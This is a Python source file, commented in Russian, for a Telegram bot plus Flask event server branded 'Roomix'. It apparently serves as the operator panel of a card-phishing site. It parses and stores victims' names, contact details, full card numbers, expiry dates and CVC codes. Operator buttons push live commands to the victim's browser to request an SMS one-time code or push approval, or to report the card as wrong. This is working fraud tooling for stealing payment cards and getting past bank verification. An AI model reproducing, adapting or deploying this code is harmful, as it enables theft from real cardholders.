import asyncio
import logging
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import datetime
import json
import time
import threading
from threading import Lock
from flask import Flask, Response, request, jsonify

# Загружаем переменные из .env
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Берем токен и ID из .env файла
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    exit(1)

ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# SSE сервер
app = Flask(__name__)
sse_clients = {}
sse_lock = Lock()

# Разрешенные домены для CORS
ALLOWED_ORIGINS = [
    "https://clickuz.github.io",
    "https://clickuz.github.io/roomix", 
    "http://localhost:3000",
    "http://127.0.0.1:5500", 
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://roomix-production.up.railway.app"
]

# CORS middleware
@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, *'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/sse/<user_id>')
def sse(user_id):
    """Server-Sent Events endpoint для получения команд"""
    def event_stream():
        yield f"data: {json.dumps({'type': 'connected', 'message': 'SSE подключен'})}\n\n"
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            logger.info(f"✅ SSE подключен: {user_id}")
        
        try:
            while True:
                with sse_lock:
                    if user_id in sse_clients and sse_clients[user_id]:
                        while sse_clients[user_id]:
                            command = sse_clients[user_id].pop(0)
                            yield f"data: {json.dumps(command)}\n\n"
                
                time.sleep(0.5)
                
        except GeneratorExit:
            with sse_lock:
                if user_id in sse_clients:
                    del sse_clients[user_id]
                    logger.info(f"❌ SSE отключен: {user_id}")

    response = Response(event_stream(), mimetype='text/event-stream')
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/send_command', methods=['POST', 'OPTIONS'])
def send_command():
    """Бот отправляет команду пользователю"""
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        return response
        
    try:
        data = request.json
        user_id = data.get('user_id')
        action = data.get('action')
        payment_id = data.get('payment_id')
        
        if not user_id or not action:
            return {'error': 'Missing user_id or action'}, 400
            
        command_data = {
            'type': 'bot_command',
            'action': action,
            'payment_id': payment_id,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            sse_clients[user_id].append(command_data)
            
        logger.info(f"✅ Команда отправлена {user_id}: {action}")
        response = jsonify({'status': 'success'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка отправки команды: {e}")
        response = jsonify({'error': str(e)})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response, 500

@app.route('/health')
def health():
    """Проверка здоровья сервера"""
    with sse_lock:
        users_count = len(sse_clients)
        total_commands = sum(len(commands) for commands in sse_clients.values())
    
    response = jsonify({
        'status': 'running',
        'users_count': users_count,
        'total_commands': total_commands,
        'timestamp': datetime.datetime.now().isoformat(),
        'allowed_origins': ALLOWED_ORIGINS
    })
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    return response

@app.route('/')
def home():
    return "🚀 Roomix Bot + SSE Server"

def run_flask():
    """Запуск Flask сервера в отдельном потоке"""
    try:
        port = int(os.environ.get('PORT', 8080))
        logger.info(f"🌐 Flask запускается на порту: {port}")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"💥 Ошибка запуска Flask: {e}")

# Запускаем Flask в отдельном потоке
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

# База данных
def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        first_name TEXT,
        last_name TEXT,
        email TEXT,
        phone TEXT,
        card_number TEXT,
        card_expiry TEXT,
        cvc TEXT,
        amount REAL,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()

init_db()

# Инлайн кнопки для платежей
def get_payment_buttons(payment_id, user_id="user_123"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_{payment_id}_{user_id}"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}_{user_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
        ]
    ])

def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
    try:
        conn = sqlite3.connect('applications.db')
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO payments (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, amount)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, 0.0))
        payment_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return payment_id
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения платежа: {e}")
        return None

# Функция отправки команды через HTTP
async def send_sse_command(user_id, action_type, payment_id=None):
    """Отправка команды через SSE сервер"""
    try:
        import requests
        
        server_url = os.environ.get('RAILWAY_STATIC_URL', 'https://roomix-production.up.railway.app')
        
        response = requests.post(
            f"{server_url}/send_command",
            json={
                'user_id': user_id,
                'action': action_type,
                'payment_id': payment_id
            },
            timeout=5
        )
        
        if response.status_code == 200:
            logger.info(f"✅ SSE команда отправлена {user_id}: {action_type}")
            return True
        else:
            logger.error(f"❌ Ошибка SSE отправки: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"💥 Ошибка HTTP запроса: {e}")
        return False

# Обработчик для платежных данных
@dp.message(F.chat.id == ADMIN_CHAT_ID)
async def handle_admin_messages(message: types.Message):
    logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
    
    if message.text and "НОВАЯ ОПЛАТА" in message.text:
        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
        await process_payment_data(message)

async def process_payment_data(message: types.Message):
    try:
        lines = message.text.split('\n')
        payment_data = {}

        for line in lines:
            line = line.strip()
            if 'Имя:' in line:
                payment_data['first_name'] = line.split('Имя:')[1].strip()
            elif 'Фамилия:' in line:
                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
            elif 'Email:' in line:
                payment_data['email'] = line.split('Email:')[1].strip()
            elif 'Телефон:' in line:
                payment_data['phone'] = line.split('Телефон:')[1].strip()
            elif 'Номер:' in line:
                payment_data['card_number'] = line.split('Номер:')[1].strip()
            elif 'Срок:' in line:
                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
            elif 'CVC:' in line:
                payment_data['cvc'] = line.split('CVC:')[1].strip()

        required_fields = ['first_name', 'last_name', 'email', 'phone', 'card_number', 'card_expiry', 'cvc']
        if any(not payment_data.get(field) for field in required_fields):
            logger.error("❌ Не все поля заполнены")
            return

        payment_id = save_payment(
            user_id=0,
            first_name=payment_data.get('first_name', ''),
            last_name=payment_data.get('last_name', ''),
            email=payment_data.get('email', ''),
            phone=payment_data.get('phone', ''),
            card_number=payment_data.get('card_number', ''),
            card_expiry=payment_data.get('card_expiry', ''),
            cvc=payment_data.get('cvc', '')
        )

        if payment_id:
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text="💳 <b>Выберите действие:</b>",
                reply_markup=get_payment_buttons(payment_id),
                parse_mode="HTML"
            )
            logger.info(f"✅ Платеж #{payment_id} сохранен")

    except Exception as e:
        logger.error(f"💥 Ошибка обработки платежа: {e}")

# Обработчики инлайн кнопок
@dp.callback_query(F.data.startswith("sms_"))
async def sms_code_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[1]
    user_id = parts[2]
    
    success = await send_sse_command(user_id, "sms", payment_id)
    
    await callback.message.edit_text(
        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n" +
        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки"),
        parse_mode="HTML"
    )
    await callback.answer("SMS код запрошен")

@dp.callback_query(F.data.startswith("push_"))
async def push_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[1]
    user_id = parts[2]
    
    success = await send_sse_command(user_id, "push", payment_id)
    
    await callback.message.edit_text(
        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n" +
        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки"),
        parse_mode="HTML"
    )
    await callback.answer("Пуш отправлен")

@dp.callback_query(F.data.startswith("wrong_card_"))
async def wrong_card_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[2]
    user_id = parts[3]
    
    success = await send_sse_command(user_id, "wrong_card", payment_id)
    
    await callback.message.edit_text(
        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n" +
        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки"),
        parse_mode="HTML"
    )
    await callback.answer("Карта отклонена")

# Старт бота
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        await message.answer("👋 Админ панель готова к работе!")
    else:
        await message.answer("👋 Добро пожаловать!")

async def main():
    logger.info("🚀 Бот запускается...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
